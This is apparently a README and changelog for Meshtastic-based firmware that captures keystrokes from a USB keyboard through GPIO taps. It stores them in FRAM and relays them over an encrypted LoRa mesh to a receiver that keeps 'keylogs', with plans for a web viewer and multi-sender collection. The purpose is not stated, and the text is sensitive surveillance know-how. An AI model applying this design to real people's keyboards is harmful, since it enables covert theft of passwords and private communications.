- `USBCaptureModule.cpp` - ACK tracking, PKI direct messages, retry logic
- `USBCaptureModule.h` - State machine for ACK handling

**Transmission Protocol:**
- Port: `PRIVATE_APP` (256)
- Payload: `[batch_id:4][decoded_text:N]`
- ACK format: `ACK:0x<8-hex-digits>`
- Retry: Exponential backoff 30s→60s→120s, then reset

**Simulation Mode:**
- Build flag: `-D USB_CAPTURE_SIMULATE_KEYS`
- Generates fake keystrokes for testing without USB keyboard

**Build:** Flash 58.5%, RAM 24.7%

### v5.0 - FRAM Non-Volatile Storage

**Feature:** 256KB non-volatile storage replacing volatile RAM buffer

**Hardware:**
- Chip: Fujitsu MB85RS2MTA (Adafruit breakout)
- Capacity: 2Mbit / 256KB (62x increase from 4KB RAM)
- Interface: SPI @ 20MHz on SPI0 (shared with LoRa)
- CS Pin: GPIO1 (D6)
- Device ID: Mfr=0x04, Prod=0x4803

**Key Benefits:**
- **Non-volatile:** Survives power loss, batches persist
- **62x capacity:** 500+ batches vs 8 RAM slots
- **Endurance:** 10^13 write cycles (virtually unlimited)
- **Fallback:** Automatically uses RAM buffer if FRAM fails

**Files Created:**
- `src/FRAMBatchStorage.cpp` - FRAM storage implementation
- `src/FRAMBatchStorage.h` - FRAM storage interface

**Files Modified:**
- `USBCaptureModule.cpp` - FRAM read/delete integration
- `USBCaptureModule.h` - FRAM extern declaration
- `keyboard_decoder_core1.cpp` - FRAM write integration
- `platformio.ini` - Added FRAM library dependencies

**Build:** Flash 58.3%, RAM 24.7% (+2.5% flash, -1.6% RAM vs v4.0)

### v4.0 - RTC Integration

**Feature:** Real unix epoch timestamps from mesh time sync

**Three-Tier Fallback:**
1. **RTC (RTCQualityFromNet):** Real unix epoch from GPS-equipped nodes
2. **BUILD_EPOCH + uptime:** Pseudo-absolute time during boot
3. **Uptime only:** Fallback when no RTC available

**Hardware Validation:**
- ✅ BUILD_EPOCH fallback during boot (1765083600 + uptime)
- ✅ Mesh sync from Heltec V4 GPS → Quality upgrade: None(0) → Net(2)
- ✅ Real unix epoch timestamps (1765155817) vs BUILD_EPOCH (1765083872)
- ✅ Delta encoding working with RTC time (+18s for Enter)

**Files Modified:**
- `keyboard_decoder_core1.cpp` - Added `core1_get_current_epoch()` with three-tier fallback
- `USBCaptureModule.cpp` - Enhanced logging with time source and quality display

### v3.5 - Critical Fixes

**1. Memory Barriers for Cache Coherency**
- Added `__dmb()` barriers to all PSRAM buffer operations
- Prevents ARM Cortex-M33 cache race conditions

**2. Statistics Infrastructure**
- Expanded PSRAM header: 32 → 48 bytes
- Added failure tracking: `transmission_failures`, `buffer_overflows`, `psram_write_failures`, `retry_attempts`

**3. Buffer Validation & Overflow Detection**
- Emergency finalization when buffer full
- Validate `data_length` before PSRAM write
- All failures tracked with `__dmb()` barriers

**4. Transmission Retry Logic**
- 3-attempt retry with 100ms delays
- Track retries in statistics
- LOG_ERROR on permanent failure
- **Impact:** Data loss reduced from 100% → ~10%

**5. Full Modifier Key Support**
- Captures Ctrl, Alt, GUI combinations
- Encoding: `^C` (Ctrl+C), `~T` (Alt+T), `@L` (GUI+L)

**6. Input Validation**
- Validate command length and ASCII range
- Reject malformed packets before processing

### v3.3 - LoRa Transmission + Text Decoding

**Features:**
- ✅ Active LoRa transmission over mesh network
- ✅ Binary-to-text decoder: `decodeBufferToText()`
- ✅ 6-second rate limiting (prevents mesh flooding)
- ✅ Remote commands working (STATUS, START, STOP, STATS)
- ✅ All magic numbers replaced with named constants

### v3.2 - Multi-Core Flash Solution

**Issues Fixed:**
1. LittleFS freeze on node arrivals
2. Config save crash via CLI
3. Dim red LED reboot loop

**Root Causes:**
- Arduino-Pico FIFO conflict (can't pause Core1)
- Core1 executing from flash during Core0 flash writes
- Watchdog still armed during reboot

**Solution:**
1. **RAM Execution:** `CORE1_RAM_FUNC` macro for ~15 functions
2. **Memory Barriers:** `__dmb()` for cache coherency
3. **Manual Pause:** Volatile flags + hardware watchdog disable

**Status:** ✅ ALL ISSUES RESOLVED - Validated on hardware

### v3.0 - Core1 Complete Processing (Major Architecture)

**90% Core0 Overhead Reduction:**
- Moved ALL buffer management to Core1
- PSRAM ring buffer (8 slots × 512 bytes = 4KB)
- Producer/Consumer pattern (Core1 produces, Core0 consumes)
- Core0 simplified to PSRAM polling + transmission only

**New Components:**
- `psram_buffer.h/cpp` - PSRAM ring buffer
- `formatted_event_queue.h/cpp` - Event queue

**Thread-Safety Fix:**
- Removed LOG_INFO from Core1 (not thread-safe, caused crashes)

**Build:** Flash 56.3%, RAM 25.8%

---

## Technical Notes

### USB Bit Stuffing
USB protocol requires bit stuffing: after 6 consecutive 1s, insert a 0. The packet handler removes these stuffed bits to reconstruct original data.

### PIO Program Patching
The PIO capture program must be patched at runtime with speed-specific wait instructions. This is why a modifiable copy is created in `pio_manager_configure_capture()`.

### Watchdog Management
Core1 updates a 4-second watchdog to detect hangs. During Core1 pause (for flash operations), watchdog is disabled via direct hardware register access (0x40058000).

### Core1 Independence
Core1 runs completely independently using:
- Global volatile variables for configuration
- PSRAM ring buffer for data communication
- FIFO signals for stop commands (0xDEADBEEF)

### Multi-Core Safety
**⚠️ CRITICAL RULES:**
- ❌ NO logging from Core1 (LOG_INFO, printf) - causes crashes
- ❌ NO Core1 code in flash - MUST use `CORE1_RAM_FUNC`
- ❌ NO watchdog enabled during pause/exit
- ✅ Use `__dmb()` memory barriers for volatile access
- ✅ Call `tight_loop_contents()` in Core1 loops

---

## Future Enhancements

### Priority 1: Web UI for Keylogs
- **Goal:** View stored keylogs via Heltec V4 web interface
- **Features:**
  - Browse keylogs by sender node
  - Download individual batch files
  - Clear old keylogs
- **Implementation:** Extend Meshtastic web server on ESP32

### Priority 2: RGB LED Status Indicators
- **Goal:** Visual feedback for FRAM operations
- **Features:**
  - Green flash on FRAM write
  - Blue flash on FRAM read
  - Red flash on FRAM delete
  - Yellow flash on ACK received
- **Hardware:** XIAO RP2350 onboard RGB LED

### Priority 3: Enhanced Features
- Function keys support (F1-F12, arrows, Page Up/Down)
- Key release detection (multi-tap support)
- Runtime configuration (USB speed, channel, GPIO)
- Core1 observability (circular log buffer)
- Command authentication (secure remote control)

### ✅ Completed: ACK-Based Reliable Transmission (v6.0)
- **Goal:** Guaranteed delivery with confirmation ✅
- **Batch tracking:** Unique batch_id per transmission ✅
- **ACK protocol:** Receiver confirms receipt ✅
- **Persistent retry:** Exponential backoff until success ✅
- **Receiver module:** KeylogReceiverModule on Heltec V4 ✅
- **PKI encryption:** Secure direct messages ✅
- **Status:** End-to-end validated 2025-12-14

### ✅ Completed: FRAM Migration (v5.0)
- **Goal:** Non-volatile storage for keystroke buffers ✅
- **Capacity:** 256KB (62x increase from 4KB RAM) ✅
- **Endurance:** 10^13 write cycles ✅
- **Benefit:** Survives power loss ✅
- **Status:** Hardware validated 2025-12-13

---

## Known Issues

### 🟢 No Critical Issues (v6.0)
All major functionality validated and working:
- ✅ FRAM storage operational
- ✅ ACK-based transmission working
- ✅ PKI encryption functional
- ✅ Receiver module storing keylogs

### 🟠 High Priority
1. Add RGB LED status indicators for FRAM/ACK operations
2. Validate SPI timing under heavy keystroke load
3. Test multi-sender scenario (multiple XIAO → one Heltec)
4. Add web UI for viewing keylogs on Heltec

### 🟡 Medium Priority
5. Add Core1 observability (circular log buffer)
6. Implement key release detection (multi-tap support)
7. Make configuration runtime-adjustable
8. Add command authentication

### 🔵 Future
9. Function key support (F1-F12, arrows)
10. Mobile app integration for keylogs
11. Cloud backup option for keylogs

---

## Quick Command Reference

### Change USB Speed
```cpp
// In USBCaptureModule::init():
capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_FULL);
```

### Increase Queue Size
```cpp
// In keystroke_queue.h:
#define KEYSTROKE_QUEUE_SIZE 128  // Must be power of 2
#define KEYSTROKE_QUEUE_MASK 0x7F // SIZE - 1
```

### Enable CRC Validation
```cpp
// In usb_packet_handler.cpp, uncomment:
if (!verify_crc16(&out_buffer[2], out_size - 2)) {
    error |= CAPTURE_ERROR_CRC;
}
```

### Add New Key Support
```cpp
// In keyboard_decoder_core1.cpp:
#define HID_SCANCODE_F1 0x3A

else if (keycode == HID_SCANCODE_F1) {
    // Add F1 handling
}
```

---

## Testing

### Verification Status (v6.0)

| Test Case | Status | Notes |
|-----------|--------|-------|
| Firmware compiles | ✅ PASS | No warnings |
| Core1 launches | ✅ PASS | Status codes received |
| PIO configures | ✅ PASS | Status 0xC3 confirmed |
| Keystrokes captured | ✅ PASS | Real keystrokes logged |
| Queue operations | ✅ PASS | Zero drops |
| Memory usage | ✅ PASS | 24.7% RAM, 58.5% Flash |
| Idle detection | ✅ PASS | CPU drops when no activity |
| Watchdog | ✅ PASS | Core1 updates properly |
| FRAM storage | ✅ PASS | Read/write operations validated |
| FRAM persistence | ✅ PASS | Survives power cycles |
| LoRa transmission | ✅ PASS | PKI encrypted direct messages |
| ACK reception | ✅ PASS | Sender receives ACK from receiver |
| Retry mechanism | ✅ PASS | Exponential backoff working |
| KeylogReceiverModule | ✅ PASS | Stores keylogs to flash |
| PKI encryption | ✅ PASS | X25519 key exchange working |
| RTC time sync | ✅ PASS | Mesh sync from Heltec V4 |
| Modifier keys | ✅ PASS | Ctrl, Alt, GUI captured |
| Simulation mode | ✅ PASS | Fake keystrokes generated |

### Test Hardware
- **Sender:** XIAO RP2350-SX1262
- **Receiver:** Heltec WiFi LoRa 32 V4
- **FRAM:** Adafruit MB85RS2MTA breakout (256KB)
- **Keyboard:** Standard USB HID keyboard (Low Speed)
- **Connections:** GPIO 16/17 via short jumper wires
- **Power:** USB bus powered

---

## License

**Module Code:** GPL-3.0-only (Meshtastic standard)
**Platform Code:** BSD-3-Clause (USB capture implementation)

---

## Maintainers

**Original Architecture:** Vladimir (PIO capture design)
**Meshtastic Integration:** [Author]
**v3.0 Architecture:** Claude (2025-12-06)

---

*Last Updated: 2025-12-14 | Version 6.0 | Production Ready | End-to-End System Validated*
